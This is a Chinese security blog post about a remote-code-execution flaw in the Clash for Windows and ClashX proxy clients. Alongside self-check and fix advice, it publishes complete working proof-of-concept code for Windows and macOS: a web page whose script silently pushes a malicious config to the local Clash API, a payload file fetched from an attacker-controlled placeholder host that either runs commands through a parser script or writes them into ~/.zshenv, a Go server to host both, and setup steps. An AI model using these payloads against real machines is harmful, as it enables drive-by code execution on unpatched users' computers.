<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/aypDTWrOMV_ssXBnDnhf_A)

  

**故事起源  
**

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/o54M721zYeRjFDq2BicxhqcF5tjUylGKL3nox7ZMiahYcibz5EwkFcWv1iaSTIN6JJGhyibtxkeDFWnkqiaok3vuiaUVw/640?wx_fmt=gif)

  

故事的开始来源于不久前在各大吃瓜群内传播的一段文字：

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9SDkQtGa2de3T3kUclhI6gN3kS0YNLmNbZVaLayow0Qvk19PE8Bp9qg/640?wx_fmt=png)

小外包看到后的第一反应：woc 实验室大佬都被上线了？

再提取下苹果电脑、某行动、终端权限、开除等关键词，瞬间

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd97Vf75rfsjWib7v5janurrh5BWWsQSuDHO4ibTlMpphGdeoeRch6WkfOQ/640?wx_fmt=png)

后续在大佬们的聊天中得知，可能是踩了某罐子，结合之前一偏 clash 的 RESTfulapi 写文件攻击的文章推测，可能是由于挂 clash 代理访问蜜罐网站，打了攻击流量就会触发蜜罐反制规则，导致被 rce。  
有大佬的视频也已经把原理讲的很明白了（不喜欢看文章的大佬也可以直接看视频）  
https://www.youtube.com/watch?v=4AnapDDMlyI

  

**Clashx 简介**

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/o54M721zYeRjFDq2BicxhqcF5tjUylGKL3nox7ZMiahYcibz5EwkFcWv1iaSTIN6JJGhyibtxkeDFWnkqiaok3vuiaUVw/640?wx_fmt=gif)

  

mac clashx 页面

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9JGkp1DZ740TdU7IX10MlkJDq7uBkMv6QwIibb2Ud0Rxp3eF7eTSApmg/640?wx_fmt=png)

ClashX 初次运行会在~/.config/clash/ 目录产生一个名为 config.yaml 的主配置文件，文件内容如下。

```
# From https://github.com/yichengchen/clashX/blob/master/ClashX/Resources/sampleConfig.yaml
#---------------------------------------------------#
## 配置文件需要放置在 $HOME/.config/clash/*.yaml
## 这份文件是clashX的基础配置文件，请尽量新建配置文件进行修改。
## ！！！只有这份文件的端口设置会随ClashX启动生效
## 如果您不知道如何操作，请参阅 官方Github文档 https://github.com/Dreamacro/clash/blob/dev/README.md
#---------------------------------------------------#
# (HTTP and SOCKS5 in one port)
mixed-port: 7890
# RESTful API for clash
external-controller: 127.0.0.1:9090
allow-lan: false
mode: rule
log-level: warning
proxies:
proxy-groups:
rules:
  - DOMAIN-SUFFIX,google.com,DIRECT
  - DOMAIN-KEYWORD,google,DIRECT
  - DOMAIN,google.com,DIRECT
  - DOMAIN-SUFFIX,ad.com,REJECT
  - GEOIP,CN,DIRECT
  - MATCH,DIRECT

```

ClashX 的使用也是基于一份配置文件，同样只需将可用的主配置文件放到~/.config/clash/ 目录下，之后就可以使用了。也可以选择「Config」-「Remote config」-「Manage」-「Add」，将远程链接填入 Url 栏中，可自动下载远程的配置文件到本地。

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd96VUGMCraefTuEIHKCahDgb5EVEOFPsr2fSNdcgob67SoELicsZgqkCw/640?wx_fmt=png)

  

**Clashx 历史漏洞**

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/o54M721zYeRjFDq2BicxhqcF5tjUylGKL3nox7ZMiahYcibz5EwkFcWv1iaSTIN6JJGhyibtxkeDFWnkqiaok3vuiaUVw/640?wx_fmt=gif)

  

**1、CFW XSS2RCE**

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9hiaAJxEc6QNXbsEIwaJb1kBlmpVs4Mics4b3cAJvtxWyJF2bkFNrGEyQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9icN7sqUreuh4ZNf3WpLKzvzQJZIsibXESC4vFmLzuia68HttD0psTiaRKg/640?wx_fmt=png)

具体细节可参考大佬文章：https://github.com/Fndroid/clash_for_windows_pkg/issues/2710  
视频：  
https://www.youtube.com/watch?v=b04N4KxuLfg

**2、CFW 路径穿越致使 parsers JS RCE**

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9Dn3QUXIWyTibjPAQCKRzaHzkzlNPEE2ZJTyEqPOCZhtpgZSguHa5wWw/640?wx_fmt=png)

参考文章：  
https://github.com/Fndroid/clash_for_windows_pkg/issues/3891  
视频：  
https://bulianglin.com/archives/clashrce.html

  

**复现**

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/o54M721zYeRjFDq2BicxhqcF5tjUylGKL3nox7ZMiahYcibz5EwkFcWv1iaSTIN6JJGhyibtxkeDFWnkqiaok3vuiaUVw/640?wx_fmt=gif)

  

根据大佬对源码的分析，课代表总结一下，因为是 clash 的路径穿越，导致 clash for windows 的配置文件被覆盖，这个漏洞可以在任何 clash 有权限的位置写入文件，会造成一些安全问题，由于是内核漏洞 Windows Linux MacOS 只要是使用 clash 内核通通都中招了，4 月 16 号 clash 发布了一个小版本更新，修复了路径穿越的漏洞，但很多人并没有意识到这个安全问题，可能不会升级到新版本，所以还是有必要让大家知晓一下，另外 clash.meta 是 clash 的分支项目，所以也存在路径穿越的漏洞，并且由于 clash 可以通过 RESTful api 来控制内部设置，并且支持 CORS，CORS 意为跨域资源共享，也就是不同的域名可以共享相同的资源，导致可以在任何网站上调用 Clash 的 API，就导致了无感知执行任意命令。  
如下给出了一份测试代码

**1、Win POC**  

**index.html:**

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta >
    <title>Breaking Clash</title>
</head>
<body>
    <h1 align="center">Breaking Clash</h1>
    <p align="center"> <img src="https://raw.githubusercontent.com/Dreamacro/clash/master/docs/logo.png"></p>
    <p>
        <script>        
            const data = {
                payload: "mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: 'http:// \{\{yourevilser\}\}/exp.yaml'\n    interval: 3600\n    path: ../cfw-settings.yaml\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204"
            };
            fetch('http://127.0.0.1:58383/configs?force=true', {
                method: 'PUT',
                headers: {
                    'Content-type': 'application/json; charset=utf-8',
                },
                body: JSON.stringify(data),
            }).then(response => response.json())
                .then(data => {
                    console.log('Success:', data);
                })
                .catch((error) => {
                    console.log('Error:', error);
                });
</script>
</body>
</html>

```

**exp.yaml：**

```
payload:
  - DOMAIN-SUFFIX,acl4.ssr,全球直连
showNewVersionIcon: true
hideAfterStartup: false
randomControllerPort: true
runTimeFormat: "hh : mm : ss"
trayOrders:
  - - icon
  - - status
    - traffic
    - text
hideTrayIcon: false
connShowProcess: true
showTrayProxyDelayIndicator: true
profileParsersText: >-
  parsers:
    - reg: .*
      code: 
        module.exports.parse = async (raw, { axios, yaml, notify, console }, { name, url, interval, selected }) => {
          require("child_process").exec("calc.exe");
          return raw;
          }

```

****main.go:****

```
package main
import (
  "github.com/gin-contrib/cors"
  "github.com/gin-gonic/gin"
)
func main() {
  r := gin.Default()
  r.Use(cors.Default())
  r.StaticFile("/", "./index.html")
  r.StaticFile("/exp.yaml", "./exp.yaml")
  r.Run(":9999")
}

```

**2、MAC POC**

**index.html:**  

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta >
    <title>Breaking Clash</title>
</head>
<body>
    <h1 align="center">Breaking Clash</h1>
    <p align="center"> <img src="https://raw.githubusercontent.com/Dreamacro/clash/master/docs/logo.png"></p>
    <p>
        <script>        
            const data = {
                payload: "mixed-port: 7890\nallow-lan: false\nmode: rule\nlog-level: warning\nproxy-providers:\n  provider1:\n    type: http\n    url: 'http://\{\{yourevilser\}\}/evil.yaml'\n    interval: 3600\n    path: ../../.zshenv\n    healthcheck:\n      enable: true\n      interval: 600\n      url: http://www.gstatic.com/generate_204"
            };
            fetch('http://127.0.0.1:9090/configs?force=true', {
                method: 'PUT',
                headers: {
                    'Content-type': 'application/json; charset=utf-8',
                },
                body: JSON.stringify(data),
            }).then(response => response.json())
                .then(data => {
                    console.log('Success:', data);
                })
                .catch((error) => {
                    console.log('Error:', error);
                });
</script>
</body>
</html>

```

**exp.yaml：**

```
open /System/Applications/Calculator.app;rm -f ~/.zshenv;bash -c 'nohup sleep 10 2>&1 > /dev/null &' <<!:
  aaaaa: 11111
proxies:
  - {name: vP, server: n04.a00x.party, port: 18000, type: ssr, cipher: aes-256-cfb, password: AFX92CS, protocol: auth_aes128_sha1, obfs: http_simple, protocol-param: 232991:xSnSFv, obfs-param: download.windowsupdate.com, udp: true}
aaaaa: 2222

```

**main.go:**

```
package main
import (
  "github.com/gin-contrib/cors"
  "github.com/gin-gonic/gin"
)
func main() {
  r := gin.Default()
  r.Use(cors.Default())
  r.StaticFile("/", "./index.html")
  r.StaticFile("/exp.yaml", "./exp.yaml")
  r.Run(":9999")
}

```

**3、触发 POC 流程**

在公网起一个 Web 服务，同时允许跨域，对外提供如上 index.html 和 exp.yaml 恶意文件，exp.yaml 文件中包含了攻击者希望执行的命令。注意将如上 html 中的 \{\{yourevilser\}\} 换成自己的 IP 或者域名。

*   安装 go 并执行  
    

```
yum -y install golang
go mod init main
go get github.com/gin-contrib/cors
go get github.com/gin-gonic/gin
go run main.go

```

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9ASC8Wibm4kH0VCc465ibRDIibVfYNibBWY8VwoLDDuaibX6n2dLQRJcAkww/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9fjqTDupafiapjZLIhm5ScAibNjDEmIGExsiaGcapFE066Cp8nx4GOFKqw/640?wx_fmt=png)

  

尝试访问触发

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9Ju3QY3MbUKRW2SzOVnyXNN00adt6pbMWTkp1w0DnSGj2IutwJmmAGA/640?wx_fmt=png)

在 windows 虚拟机中安装了低版本的 clash_for_windows 并成功复现了此漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9An8z9cENsb6acGUTc9dhicicTLcubR8sOOhDibRppKgYvLJib0C3Ls60pQ/640?wx_fmt=png)

同事也在未更新 clashx 的 mac 环境下复现成功，mac os 版本为 10.13.6

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd90tMx5hqgiaLSZOdJviaSRGZdYKBbrp3AP7aOG8GTrr1FpHw3UAl9WGTw/640?wx_fmt=png)

也有大佬说漏洞与 macos 版本也有关，笔者做了实验，在最新的 clashx（未修改配置文件）和最新的 mac 系统下已无法复现此漏洞，建议各位红队大哥们及时升级 clashx 和自己的 mac 电脑到最新版本，防止中招。

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9nS9ED6d5DAGeHKnTKwmUKNeOyt4miaqIfzKrfu86omMNof7U5FXicD0g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9X5vYVvLtDpkorArjjic7ByyazWhrLotpsCwDiachWhiaOzY1niaoLFBq9A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd90V3tnRU6xbzlQialD0yWCXWrq7PibC6fxwomMeYiaq2sbrYCVtiarjJEBQ/640?wx_fmt=png)

  

**自查方式**

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/o54M721zYeRjFDq2BicxhqcF5tjUylGKL3nox7ZMiahYcibz5EwkFcWv1iaSTIN6JJGhyibtxkeDFWnkqiaok3vuiaUVw/640?wx_fmt=gif)

  

有 clashx 的小伙伴访问本机 127.0.0.1:9090 端口，若出现下图同样结果且 clashx 非最新版本，则存在被攻击风险。

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9nqhv40sX5dnRTqVx5yicoDSg5LCcns6bFxtmrcQd9UkRhs6H4KBuxGQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9LB0bAiaas0CDQuVBlppF4ib12eNr3jHKpOJiaC0yUyia9biaj8iczp82WkYA/640?wx_fmt=png)

  

**修复建议**

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/o54M721zYeRjFDq2BicxhqcF5tjUylGKL3nox7ZMiahYcibz5EwkFcWv1iaSTIN6JJGhyibtxkeDFWnkqiaok3vuiaUVw/640?wx_fmt=gif)

  

  

1、注释配置文件中 external-controller 这一行代码（注意需要重启客户端）

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd98Y5pqz25ObVcuC0ZFjBdKUzPmGI4uprfcN7SdMoj2YSgxvecQ1l6Kg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9tiana2Z2rjbxhfWUibFFtsUp2trfbibiahT3Wm2FO4gEuL6NDcYP8tuXtA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9pHQ7t3t9vOLr3RgC9vRibp95je6XQYOIzib1VmOsagx3eRKntV3hFalA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9LFxibyu0R1QkRWd8dYADthXa6Hia1qOMib6peIYx7wkib5jmCU4aibwicB0A/640?wx_fmt=png)

1.  2、在配置文件中增加强度足够的 secret 值
    

![](https://mmbiz.qpic.cn/mmbiz_png/rz9smmdjybGyWW62Rmcbtqje76KEOkd9V9n1jLdzdbrGhjhqVJnfRiaXZ3NxOjzmQSAtjYtgaYQHk308HoFuuDA/640?wx_fmt=png)

参考文章链接：https://0xf4n9x.github.io/2022/10/20/clash-unauth-force-configs-csrf-rce/index.html

好了，下面来谈谈 BubBounty 笔记这个星球的主体内容和特色了：

1. 主要为 web 安全和开发相关的内容，这里的内容为本星球主要内容，为什么要有开发相关的知识，主要也是为了解决原理性相关的问题，后期在阅读源代码的时候不至于一脸懵逼......

目前的主体计划和内容大体如下所示:

![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7yNnvZzhMceuz8hlGqv3ThhicBXtZXr4JNbkLXZvyKHq8aTtq8o8icSo1osnhCSmWlLt9mGLteeLiaQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

风格大体上为每个专题尽可能先讲解基础原理性的知识，而后再讲解如何去找寻此类漏洞 / 问题, 去提炼总结思路，有可能的话, 尽可能转化为自动化

2. 主要为计算机原理相关的内容, 这一部分为副线，毕竟本人精力也有限，有时间就不定期更新内容，主要还是受猪猪侠的《我的白帽学习路线》启发而来。

**![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW7yNnvZzhMceuz8hlGqv3ThCZ77rwF5sahqzH5uFNkTUlSDhXeHGqjfhVibNnTibdX8pYTAcFmS3RibQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)**

![](https://mmbiz.qpic.cn/mmbiz_gif/6xI4h676QXzia5naazW6wFR5ml91zib85OvAXYkjX7SADv3r5UgfhuoogngyhU2kOyoSu4ribjEFDM43rqYficHO2w/640)

  

END

  

![](https://mmbiz.qpic.cn/mmbiz_gif/6xI4h676QXzia5naazW6wFR5ml91zib85Op2gnu1zianmBk5b6UDXDag0BIADFFZ0w71xSIjLpXrNRQ94CEMmVFOQ/640)